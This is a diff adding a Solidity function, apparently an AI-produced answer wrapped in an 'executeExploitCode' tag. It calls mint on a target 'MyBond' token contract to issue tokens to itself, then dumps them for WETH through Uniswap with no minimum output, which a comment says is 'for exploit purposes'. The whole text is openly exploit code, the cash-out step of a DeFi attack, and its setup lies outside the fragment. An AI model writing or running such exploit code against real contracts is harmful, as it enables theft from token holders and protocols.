@@ -1,0 +1,25 @@
+```xml
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Use the valuableToken received to mint MyBond tokens
+    IMyBond(target).mint(address(this), amount);
+
+    // Check the balance of MyBond tokens
+    uint256 bondBalance = IERC20(target).balanceOf(address(this));
+
+    // Now swap MyBond tokens for WETH through Uniswap
+    address[] memory path = new address[](2);
+    path[0] = target; // MyBond token address
+    path[1] = uniswapRouter.WETH(); // WETH address
+
+    // Perform the swap
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
+        bondBalance,
+        0, // No minimum amount out (risky but for exploit purposes)
+        path,
+        address(this),
+        block.timestamp
+    );
+}
+</executeExploitCode>
+```
